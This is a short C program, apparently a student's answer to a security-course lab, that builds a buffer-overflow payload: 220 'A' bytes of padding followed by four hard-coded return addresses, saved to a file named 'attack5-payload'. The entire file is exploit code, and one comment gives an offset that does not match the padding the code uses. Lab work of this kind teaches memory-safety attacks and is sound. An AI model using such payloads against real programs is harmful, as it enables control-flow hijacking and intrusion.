#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
    char buf[236];
	memset(buf, 'A', 220);  //76 is the distance between buf and eip
	buf[220]=0x6b;
	buf[221]=0x86;
	buf[222]=0x04;
	buf[223]=0x08;
	buf[224]=0xc6;
	buf[225]=0x86;
	buf[226]=0x04;
	buf[227]=0x08;
	buf[228]=0x21;
	buf[229]=0x87;
	buf[230]=0x04;
	buf[231]=0x08;
	buf[232]=0xd0;
	buf[233]=0x84;
	buf[234]=0x04;
	buf[235]=0x08;
		
	
    write_to_file( "attack5-payload", buf , 236 , FILE_CLEAR );
    exit(0);
}
